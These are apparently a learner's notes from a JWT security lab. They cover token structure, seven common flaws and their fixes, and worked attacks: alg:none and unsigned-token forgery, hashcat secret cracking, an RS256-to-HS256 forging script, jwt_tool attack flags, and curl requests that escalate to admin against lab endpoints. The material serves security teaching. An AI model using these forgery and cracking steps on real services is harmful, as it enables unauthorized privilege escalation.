# 🔐 JWT Security

---

## What is a JWT?

A **JSON Web Token (JWT)** is a compact, URL-safe token used for authentication and session management in APIs.

It consists of three Base64Url-encoded parts separated by dots:

```text
header.payload.signature
```

| Part | Contains |
|------|----------|
| **Header** | Token type (`JWT`) + signing algorithm (e.g. `HS256`) |
| **Payload** | Claims such as `userId`, `role`, `admin`, `exp` |
| **Signature** | Cryptographic proof the token has not been tampered with |

> **One-liner:** Header says **how** to verify, Payload says **who** you are, Signature proves it is real.

---

## How JWTs Work

1. User logs in and the server generates a signed JWT.
2. The client stores the token, usually in `localStorage` or a cookie.
3. The client sends it on each request using:

```http
Authorization: Bearer <token>
```

4. The server verifies the signature before granting access.

---

## Why APIs Use Tokens

Traditional cookies are browser-oriented, but APIs often serve web apps, mobile apps, and other clients. JWTs are **interface-agnostic**, so developers can manually attach them to API requests.

Typical flow:

- POST credentials → receive JWT
- JavaScript stores token in `localStorage`
- Every request loads token and adds it to the `Authorization` header

> Token-based auth gives developers flexibility, but that same flexibility creates security mistakes when validation is weak.

---

## Key Security Idea

The **signature** is what makes a JWT trustworthy — **not** the payload.

- The payload is only Base64Url-encoded, not encrypted
- Anyone who gets the token can decode the header and payload
- Only the signature proves the claims are legitimate and untampered

If signature verification is weak or skipped, an attacker can forge claims such as `admin: 1`.

---

## JWT Security Vulnerabilities

These are the main weaknesses you must know:

| Vulnerability | What Happens | Main Fix |
|--------------|--------------|----------|
| `alg: none` / algorithm downgrade | Signature verification is bypassed | Whitelist algorithms |
| RS256 → HS256 confusion | Public key gets abused as HMAC secret | Separate symmetric/asymmetric logic |
| Weak secrets | Secret can be brute-forced offline | Use long random secrets |
| Missing `exp` | Token may never expire | Always set expiry |
| Sensitive data in payload | Anyone can read secrets in claims | Keep sensitive data server-side |
| Header injection (`kid`, `jku`, `x5u`) | Attacker influences key lookup | Strict key validation |
| Missing `aud` validation | Token for one app works on another | Enforce audience claim |

---

## Sensitive Data Disclosure

JWT payloads are sent completely to the client. That means they are **readable by anyone** who has the token.

```bash
echo "<payload_part>" | base64 -d
```

### Bad Example

```python
payload = {
    "username": username,
    "password": password,
    "admin": 0,
    "flag": "[redacted]"
}
access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```

This is insecure because passwords, flags, secrets, internal IPs, API keys, and private data should never be inside the JWT payload.

### Good Practice

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256"])
username = payload['username']
flag = self.db_lookup(username, "flag")
```

Store only the minimum claims needed for authorization:

- `userId` or UUID
- `role` or `admin`
- `exp`
- `iss`
- `aud` where required

> A JWT is a **transparent envelope**: signed, not sealed.

---

## Signature Validation Mistakes

These are the most exploitable JWT issues because they let attackers forge tokens and escalate privileges.

### 1. No Signature Verification

The server decodes the token without validating the signature.

```python
payload = jwt.decode(token, options={'verify_signature': False})
```

**Exploit:** modify the payload, set `admin: 1`, remove the signature, and submit:

```text
header.modifiedpayload.
```

**Fix:** always verify signatures in production.

### 2. `alg: none` Attack

The server trusts the `alg` value from the attacker-controlled header.

```python
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, self.secret, algorithms=header['alg'])
```

**Exploit steps:**

1. Change header `alg` to `None`
2. Change payload `admin` to `1`
3. Re-encode with Base64Url
4. Remove the signature and keep the trailing dot

**Fix:** hardcode a whitelist:

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])
```

### 3. Weak Secret (HS256)

Short or guessable HMAC secrets can be brute-forced offline.

```bash
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
```

Once the secret is cracked, the attacker can forge a new JWT with `admin: 1` and sign it correctly.

**Fix:** use long, random, high-entropy secrets, ideally 32+ characters.

### 4. RS256 → HS256 Confusion

If a server allows both symmetric and asymmetric algorithms together, some implementations can end up using the **public key** as an HMAC secret.

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256", "RS256"])
```

**Exploit:**

- Obtain the public key
- Change `alg` from `RS256` to `HS256`
- Set `admin: 1`
- Sign the forged token using the public key as the secret

```python
import jwt
access_token = jwt.encode({"username": "user", "admin": 1}, public_key, algorithm="HS256")
```

**Fix:** keep HS and RS verification logic separate.

---

## Attack Cheatsheet

| Attack | Modify | Signature |
|--------|--------|-----------|
| No verification | Payload only | Remove or keep |
| `alg: none` | Header + Payload | Remove, keep trailing dot |
| Weak secret | Payload | Re-sign with cracked secret |
| RS256 → HS256 | Header + Payload | Sign with public key |

> Root cause: the server skips verification, trusts attacker-controlled input, uses weak secrets, or confuses key handling.

---

## Lab Setup

Base lab URL:

```text
http://10.80.145.153/api/v1.0/exampleX
```

Replace `X` with the example number.

### Authenticate

```bash
curl -H 'Content-Type: application/json' -X POST \
-d '{"username":"user","password":"passwordX"}' \
http://10.80.145.153/api/v1.0/exampleX
```

### Verify / Access

```bash
curl -H 'Authorization: Bearer <JWT>' \
http://10.80.145.153/api/v1.0/exampleX?username=admin
```

**Goal:** forge or manipulate the JWT so `admin = 1`, then query the admin user to retrieve the flag.

---

## Example Commands

### Example 2 — No Signature Verification

```bash
curl -H 'Content-Type: application/json' -X POST \
-d '{"username":"user","password":"password2"}' \
http://MACHINE_IP/api/v1.0/example2

curl -H 'Authorization: Bearer <JWT>' \
http://MACHINE_IP/api/v1.0/example2?username=user

curl -H 'Authorization: Bearer <header.modifiedpayload.>' \
http://MACHINE_IP/api/v1.0/example2?username=admin
```

### Example 3 — `alg: none`

```bash
curl -H 'Content-Type: application/json' -X POST \
-d '{"username":"user","password":"password3"}' \
http://MACHINE_IP/api/v1.0/example3
```

Then decode the JWT, change `alg` to `None`, set `admin` to `1`, re-encode, remove the signature, and submit:

```bash
curl -H 'Authorization: Bearer <newheader.newpayload.>' \
http://MACHINE_IP/api/v1.0/example3?username=admin
```

### Example 4 — Weak Secret

```bash
curl -H 'Content-Type: application/json' -X POST \
-d '{"username":"user","password":"password4"}' \
http://MACHINE_IP/api/v1.0/example4

echo "<JWT>" > jwt.txt
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list

curl -H 'Authorization: Bearer <forged_JWT>' \
http://MACHINE_IP/api/v1.0/example4?username=admin
```

### Example 5 — RS256 → HS256

```bash
curl -H 'Content-Type: application/json' -X POST \
-d '{"username":"user","password":"password5"}' \
http://MACHINE_IP/api/v1.0/example5
```

Forge token:

```python
import jwt
public_key = "ADD_KEY_HERE"
payload = {
    'username': 'user',
    'admin': 1
}
access_token = jwt.encode(payload, public_key, algorithm="HS256")
print(access_token)
```

Submit:

```bash
curl -H 'Authorization: Bearer <forged_JWT>' \
http://MACHINE_IP/api/v1.0/example5?username=admin
```

---

## Example 5 Walkthrough

This example is similar to the `alg: none` issue, except the `None` algorithm is blocked. However, the server also returns the **public key**, which is not normally secret.

The attack is to:

1. Authenticate and collect the public key
2. Downgrade the JWT algorithm to `HS256`
3. Change `admin` from `0` to `1`
4. Sign the token using the public key as the HMAC secret
5. Send the forged token to the admin endpoint

Example response after authentication:

```json
{
  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
  "token": "<RS256_TOKEN>"
}
```

Forging script:

```python
import jwt
public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip"
payload = {
    'username': 'user',
    'admin': 1
}
access_token = jwt.encode(payload, public_key, algorithm="HS256")
print(access_token)
```

> In this lab context, tools like `jwt.io` or the provided room environment can be easier than manually editing library checks.

---

## jwt_tool

### Install jwt_tool

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
sudo apt install python3-pip
python3 -m pip install termcolor cprint pycryptodomex requests
chmod +x jwt_tool.py
```

### Common Usage

#### Decode and inspect

```bash
python3 jwt_tool.py <JWT>
```

#### Tamper claims interactively

```bash
python3 jwt_tool.py <JWT> -T
```

#### `alg: none` attack

```bash
python3 jwt_tool.py <JWT> -X n
```

#### Crack weak secret

```bash
python3 jwt_tool.py <JWT> -C -d jwt.secrets.list
```

#### Re-sign with known secret

```bash
python3 jwt_tool.py <JWT> -T -S hs256 -p "cracked_secret"
```

#### RS256 → HS256 confusion

```bash
python3 jwt_tool.py <JWT> -X k -pk publickey.pem
```

#### Verify with JWKS

```bash
python3 jwt_tool.py <JWT> -V -jw <jwks.json>
```

### Quick Reference

| Flag | Purpose |
|------|---------|
| `-T` | Tamper claims interactively |
| `-X n` | `alg: none` attack |
| `-X k` | RS256 → HS256 key confusion |
| `-C -d <wordlist>` | Crack weak secret |
| `-S hs256 -p <secret>` | Re-sign with known secret |
| `-V -jw <jwks.json>` | Verify with public JWKS key |

---

## Token Lifetime

If the `exp` claim is missing, a stolen JWT may remain valid forever.

### Why This Matters

- JWTs are typically stateless
- The server often cannot revoke them easily after issue
- A stolen token without expiry can become long-term access for an attacker

### Good Practice

```python
lifetime = datetime.datetime.now() + datetime.timedelta(minutes=5)

payload = {
    'username': username,
    'admin': 0,
    'exp': lifetime
}

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```

### Quick Rules

| Setting | Risk |
|---------|------|
| No `exp` | Token valid forever |
| `exp` too large | Long abuse window |
| Short `exp` (5–15 mins) | Best practice |
| Refresh tokens | Safer long-lived sessions |

> Rule of thumb: highly sensitive apps should use very short-lived access tokens plus refresh tokens.

---

## Cross-Service Relay Attack

If multiple apps trust the same auth server, but one app does **not** verify the `aud` claim, a token meant for one application can be replayed against another.

```text
Auth server issues token for appB → attacker reuses it on appA → appA skips audience check → access granted
```

### Example 7

```bash
curl -H 'Content-Type: application/json' -X POST \
-d '{"username":"user","password":"password7","application":"appA"}' \
http://MACHINE_IP/api/v1.0/example7

curl -H 'Content-Type: application/json' -X POST \
-d '{"username":"user","password":"password7","application":"appB"}' \
http://MACHINE_IP/api/v1.0/example7

curl -H 'Authorization: Bearer <appB_JWT>' \
http://MACHINE_IP/api/v1.0/example7_appA?username=admin
```

### Bad vs Good

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256"])
```

```python
payload = jwt.decode(token, self.secret, audience=["appA"], algorithms=["HS256"])
```

### Claims That Must Be Verified

| Claim | Purpose | Must Verify? |
|-------|---------|--------------|
| `aud` | Which app the token is for | ✅ Yes |
| `iss` | Which auth server issued it | ✅ Yes |
| `exp` | When it expires | ✅ Yes |
| `admin` | Privilege level | Only trust after verification |

---

## Final Summary

### 6 Golden Rules

1. Never store sensitive data in claims
2. Always verify the signature
3. Whitelist allowed algorithms
4. Use strong secrets
5. Always set `exp`
6. Enforce the `aud` claim

### Vulnerabilities at a Glance

| # | Vulnerability | Impact | Fix |
|---|--------------|--------|-----|
| 1 | Sensitive data in claims | Data leakage | Store sensitive data server-side |
| 2 | No signature verification | Full token forgery | Always verify signatures |
| 3 | `alg: none` downgrade | Signature bypass | Whitelist algorithms |
| 4 | Weak secret | Offline cracking and forgery | Use strong random secret |
| 5 | RS256 → HS256 confusion | Public-key-based forgery | Separate algorithm logic |
| 6 | Missing `exp` | Persistent token abuse | Set short expiry |
| 7 | Missing `aud` check | Cross-service privilege escalation | Enforce audience validation |

### One-liner to Remember

A JWT is only as secure as its **signature algorithm, secret, and validation logic**. Break any one of them, and the whole trust model collapses.

---

## References

- [Swagger](https://swagger.io/)
- [Postman](https://www.postman.com/)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [jwt.io](https://jwt.io/)
